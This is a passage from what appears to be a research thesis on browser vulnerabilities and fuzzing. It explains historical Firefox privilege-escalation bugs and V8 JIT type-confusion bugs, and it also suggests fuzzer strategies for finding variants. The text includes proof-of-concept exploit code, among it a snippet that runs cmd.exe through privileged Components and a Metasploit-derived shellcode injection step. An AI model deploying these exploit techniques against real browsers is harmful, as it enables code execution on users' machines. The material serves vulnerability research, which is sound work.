23:     }, 10); 
24: } 
25: function step3() { 
26:     var clear = setInterval(function () { 
27:         if (!frames[0]) return; // will throw until the frame is accessible 
28:         top.vvv.messageManager.loadFrameScript('data:,' + execute_shellcode_function, false); 
29:         clearInterval(clear); 
30:         setTimeout(function () { top.vvv.close(); }, 100); 
31:     }, 10); 
32: } 
“How easily could an exploit be constructed based on the patch? Not easily, but this is pwn2own” 117 
The chrome://browser/content/browser.xul page is a special privileged page in Mozilla 
Firefox. Note that the chrome handler is not related to the Chrome browser. Also note that 
in the current Mozilla Firefox version the browser.xul page was renamed to browser.xhtml 
118. 
The PoC opens the page in a new window and obtains a reference to it to inject JavaScript 
code. This is typically not possible because JavaScript code cannot obtain a reference to a 
privileged page. However, the above code passes a callback function to the createOffer() 
function in line 2. This function is from mozRTCPeerConnection which is implemented in 
WebIDL. Inside WebIDL the flag aFreeSecurityPass is set to true which means references 
to privileged pages such as browser.xul can be obtained. The root cause of this vulnerability 
was that this flag was not set to false before the callback function was invoked. 
The reference is accessed in the step1() function via frames[0].frames[2]. The code is 
executed in an interval until the page finished loading. When this happens, the location can 
116 https://leucosite.com/Edge-Chromium-EoP-RCE/ 
117 https://bugzilla.mozilla.org/show_bug.cgi?id=982909 
118 https://bugzilla.mozilla.org/show_bug.cgi?id=1553188 
60 
be accessed and does not throw an exception. After that, the location is set to a data URI in 
line 9 which contains the JavaScript code which should be executed in the context of the 
privileged browser.xul page. In this privileged page the Components global variable is 
available which means the following code can be used to execute arbitrary system 
commands: 
01: C = Components; 
02: c = C.classes; 
03: i = C.interfaces; 
04: f = c['@mozilla.org/file/local;1'].createInstance(i.nsILocalFile); 
05: p = c['@mozilla.org/process/util;1'].createInstance(i.nsIProcess); 
06: f.initWithPath('C:\\Windows\\System32\\cmd.exe'); 
07: p.init(f); 
08: p.run(0, ['/k calc.exe'], 1); 
The above code was taken from the original Pwn2Own 2014 exploit, which is available in 
the second bug tracker 119. The first PoC, which is from a Metasploit exploit 120, is more 
complex because it uses generic exploitation functions from the Metasploit framework. The 
execute_shellcode_function from line 28 calls the run_payload 121 function from Metasploit. 
This function uses the Components global to import the ctypes.jsm file which can be used 
to interact with the WindowsAPI to call functions such as VirtualAlloc to execute shellcode. 
To import the file, the code must be executed on the about:blank page. The step2() and 
step3() functions implement the code injection into the about:blank page. 
It is important to mention that it is not directly possible to interact with the opened privileged 
page because of the Same-Origin-Policy (SOP). The code in the step1() function therefore 
exploits the vulnerability again and sets the third argument to a string starting with chrome 
to specify that it is a chrome page. Then, messageManager can be used to interact with the 
page although SOP is enforced. It is important to pass the mozBrowser attribute in the 
loaded iframe so that an access via messageManager is possible. 
Generalization for variation analysis: 
• 
A fuzzer should try to open privileged pages within callback functions and check if a 
reference can be obtained. In such a case an injected crash should be triggered to 
log the vulnerability. 
• 
A fuzzer should try to find other callback locations with a free security pass. 
119 https://bugzilla.mozilla.org/show_bug.cgi?id=982909 
120 https://www.exploit-db.com/exploits/34448 
121 https://github.com/rapid7/metasploit-
framework/blob/65521270ea2021b23d3e5509d0339be20f587c90/lib/msf/core/exploit/remote/firefox_privilege_
escalation.rb 
61 
Firefox bug 1120261 and bug 987794, CVE-2014-8636 – Proxy prototype privilege 
JavaScript injection via XPConnect 
01: var props = {}; 
02: props['has'] = function(){        
03: 
var chromeWin = open("chrome://browser/content/browser.xul", "x")(); 
04: }; 
05: document.__proto__ = Proxy.create(props); 
Proxy objects are the source of many browser vulnerabilities. They allow to hijack getters 
and setters to return arbitrary other values or change states to break assumptions from 
developers. In this case the has function is proxied in the document prototype. When 
privileged code invokes this function, the privileges are not dropped and the code from line 
3 therefore executes with higher privileges which allow to obtain a reference to the 
browser.xul page. 
The vulnerability can similarly be exploited as CVE-2014-1510. The full exploit 122 is available 
in Metasploit, a writeup is available at 123. 
Generalization for variation analysis: 
• 
This vulnerability can be identified using the same techniques as mentioned with 
CVE-2014-1510. 
122https://github.com/rapid7/metasploit-
framework/blob/master/modules/exploits/multi/browser/firefox_proxy_prototype.rb 
123https://blog.rapid7.com/2015/03/23/r7-2015-04-disclosure-mozilla-firefox-proxy-prototype-rce-cve-2014-
8636/ 
62 
4.5 JIT optimization vulnerabilities 
Just-in-Time (JIT) compilation bugs form a significant class of recently exploited 
vulnerabilities. JavaScript functions are initially executed by an interpreter and if the number 
of invocations reaches a specific threshold, the function is passed to JIT compilation to 
optimize the code. Flawed optimization can lead to trivial exploitable conditions. For 
example, when the compiler incorrectly assumed that bound or type checks can be removed. 
This leads to OOB memory access which leads in most cases to: 
• 
an information leakage via OOB read which can be used to bypass ASLR 
• 
and to an OOB write, which leads to full code execution. 
Optimization is performed on type feedback collected during interpretation. The compiler 
speculates that in the future arguments will have the same type as previously seen. The 
code is therefore compiled optimized for these observed types. Runtime checks are added 
to ensure that the speculative type assumptions hold. When the types do not match at 
runtime, a fallback to the interpreter is performed. This fallback is called deoptimization in v8 
and bailout in SpiderMonkey. 
A vulnerability occurs if the JIT implementation is flawed and the compiler can be tricked to 
remove runtime checks to prevent deoptimization, although objects with different types are 
passed. The following pseudo-code demonstrates this: 
01: function opt(o) { 
02:     // code performing actions on o 
03: } 
04: for (let i = 0; i < 10000; i++) { 
05:     opt(object1); 
// Give interpreter feedback for type1 
06: } 
07: opt(object2); 
// Call optimized function with type2 
The code is called in a loop to trigger the JIT compilation. After that, an object with a different 
type is passed as argument. Interpreting the same function several thousand times until the 
threshold for compilation gets triggered, wastes a lot of unnecessarily CPU time. Debug 
builds therefore contain functionality to explicitly trigger optimization. The following code is 
from v8 and must be started with the --allow-natives-syntax flag: 
01: function opt(o) { 
02:     // code performing actions on o 
03: } 
04: opt(object1); 
// Give interpreter feedback for type1 
05: %OptimizeFunctionOnNextCall(opt); 
06: opt(object2); 
// Call optimized function with type2 
To increase fuzzing speed the associated code from the debug build can be enabled.  
63 
4.5.1 Missing or incorrect type checks 
Since the compiler optimizes functions based on speculative types of arguments or global 
variables, code which checks these assumptions at runtime must be added. V8 translates 
JavaScript code during compilation to a sea-of-nodes graph. To guarantee specific types, a 
CheckMap node gets inserted in the graph. This node gets later translated to machine code 
which performs the type check of the passed object. If the type does not match the 
speculated type, deoptimization gets triggered.  
A problem occurs if the code does not add such a CheckMap node or when the compiler 
concludes in a later optimization phase that the CheckMap node is not required and can be 
removed. For example, if an argument is accessed several times in a function, every access 
would lead to the insertion of a CheckMap node. However, if the type of the argument cannot 
change between two CheckMap nodes, the second check can be removed. 
If such an optimization can incorrectly be triggered, for example by changing the type in the 
correct moment where the compiler assumes that the type cannot change, it leads to 
vulnerabilities similar to the presented type-confusion bugs from chapter 4.2.3. 
The structure of the optimized function is always the same in this vulnerability category: 
1. Initially, the target is accessed. This can be a variable, a property or an array. The 
initial access ensures that a map or bound check gets added. 
2. Next, code which modifies the state of the target is added. This can be code which 
modifies the array length, code which changes the internal representation of 
properties or code which changes the type of a variable. A flaw must exist in the 
compiler which lets the compiler assume that this state modification cannot happen. 
3. Finally, the target is accessed again. Since a map or bound check was already added 
in step one, the compiler does not add another check if it assumes that code from 
step two cannot modify the state. This leads to a type confusion. 
To find new vulnerabilities of this category, a fuzzer must just fuzz code for step two. The 
code for step one and three is always the same and can therefore be hardcoded which 
reduces the search space. 
64 
Examples: 
Chromium issue 460917, CVE-2015-1242 – Elements-kind type confusion 
01: function opt(a1, a2) { 
02:     // Perform an operation on a2 that needs a map check (for DOUBLE_ELEMENTS). 
03:     var s = a2[0]; 
04:     // Emit a load that transitions a1 to FAST_ELEMENTS. 
05:     var t = a1[0]; 
06:     // Emit a store to a2 that assumes DOUBLE_ELEMENTS. 
07:     // The map check is considered redundant and will be eliminated. 
08:     a2[0] = 0.3; 
09: } 
10: // Prepare type feedback for the "t = a1[0]" load: fast elements. 
11: var fast_elem = new Array(1); 
12: fast_elem[0] = "tagged"; 
// Store an object/string 
13: opt(fast_elem, [1]); 
14: // Prepare type feedback for the "a2[0] = 0.3" store: double elements. 
15: var double_elem = new Array(1); 
16: double_elem[0] = 0.1; 
// Store a double value 
17: opt(double_elem, double_elem); 
18: // Reset |double_elem| 
19: double_elem = new Array(10);     
20: double_elem[0] = 0.1; 
21: %OptimizeFunctionOnNextCall(opt); 
22: opt(double_elem, double_elem); 
23: assertEquals(0.3, double_elem[0]); 
The opt function is called in total three times. The invocations in line 13 and 17 are performed 
to let the interpreter collect the required type feedback. In the first invocation the fast_elem 
array is passed which stores its elements as fast elements 124. The elements-kind field in the 
map is set to fast elements because a string is stored as first element, see line 12. Since a 
string is stored in the array, the engine assigns the generic fast elements type. With this type 
elements are stored in a contiguous buffer and accessing them using an index is therefore 
fast, hence the name fast elements. Slow elements on the other hand would use a dictionary 
to save the properties. 
Another elements-kind value is double elements which means that only double values are 
stored in the array. In such a case the floating-point representation of the values can directly 
be stored in the elements buffer. If a double value is instead stored in in a fast elements 
array, a pointer to a heap object, which stores the floating-point representation, would be 
stored in the buffer at the provided index. 
In line 8 a floating-point value is written to the array and the elements-kind field is assumed 
to be double elements. The compiler assumes this because in the first two invocations from 
line 13 and 17 the array just stored a SMI and a double value. The compiler therefore 
speculates that the type will be double elements in the future. 
That means that the floating-point representation of 0.3 is written to the elements buffer at 
index zero. Typically, a map check would be added to ensure that elements kind is correct. 
However, a similar map check already gets added because of line 3. The compiler assumes 
124 https://v8.dev/blog/fast-properties 
65 
that the map of a2 cannot change between line 3 and 8 because a2 is not accessed there 
and therefore omits the second map check. However, line 5 transitions the elements-kind of 
a1 to fast elements because the interpreter collected during the first invocation for a1 the 
type feedback of fast elements. This feedback was collected because line 12 assigned a 
string to an element. 
Although the interpreter sees during the second invocation from line 17 a double value stored 
in a1, the compiler still transitions to fast elements because fast elements is a more generic 
type which can handle strings and double values. 
To exploit the bug, the function is invoked in line 22 by passing the same array as first and 
second argument which means that line 5 modifies a2 because a2 and a1 reference the 
same array. This is only achieved in the last call because in the second function invocation 
in line 17 the code was not optimized yet. During the last invocation the compiled code writes 
in line 8 the floating-point representation to the elements buffer although elements-kind 
changed to fast elements. When the element is later accessed as done in line 23, the written 
floating-point value gets interpreted as a pointer to a heap object because of the updated 
elements-kind field. This means that arbitrary objects can be faked in memory by writing the 
address of the fake object as floating-point value using this vulnerability.  
Generalization for variation analysis: 
• 
A fuzzer should create functions with two or more arguments and call the function 
until compilation is triggered. It is important that in every function invocation the 
passed arguments are different and do not point to the same object in-memory. The 
optimized function should finally be called with both or all arguments pointing to the 
same object to trigger vulnerabilities. 
• 
One of the first instructions in such functions should access the elements to include 
at the beginning a map check like done in line 3. One of the last instructions should 
write to the elements like done in line 8. The code in between should be fuzzed. It is 
important that this code is not too long. If the code contains a function call which can 
trigger side effects, the map check at the end would not get removed. 
• 
A fuzzer should use the OptimizeFunctionOnNextCall native function to trigger 
optimization. 
• 
A common strategy during fuzzing is to wrap code within try { /* code */ } 
catch (e) {} blocks. If the fuzzer creates invalid code, which happens frequently 
using random fuzzing, the code would catch the exception and the remaining code 
would continue execution. However, the exception handling code hinders the 
compiler from performing optimization and JIT vulnerabilities can therefore not be 
found. [39] The fuzzilli fuzzer solved this problem by introducing an IL and performed 
mutations on the IL. Lifting the IL back to JavaScript code ensured that mainly valid 
code gets generated. 
66 
Chromium issue 722756, CVE-2017-5070 – Type-Confusion because of incorrect 
optimization 
01: var array = [[{}], [1.1]]; 
02: var double_array = [1.1, 2.2]; 
03: var flag = 0; 
04: var expected = 6.176516726456e-312; // Internal representation: 0x12312345671 
05: function transition() { 
06:     for (var i = 0; i < array.length; i++) { 
07:         var arr = array[i]; 
08:         arr[0] = {}; 
// Store an obj in “array” 
09:     } 
10: } 
11: function swap() { 
12:     try { } catch (e) { }  // Prevent compiler from inlining the function 
13:     if (flag == 1) { 
14:         array[1] = double_array; 
15:     } 
16: } 
17: function opt() { 
18:     swap(); 
19:     double_array[0] = 1; 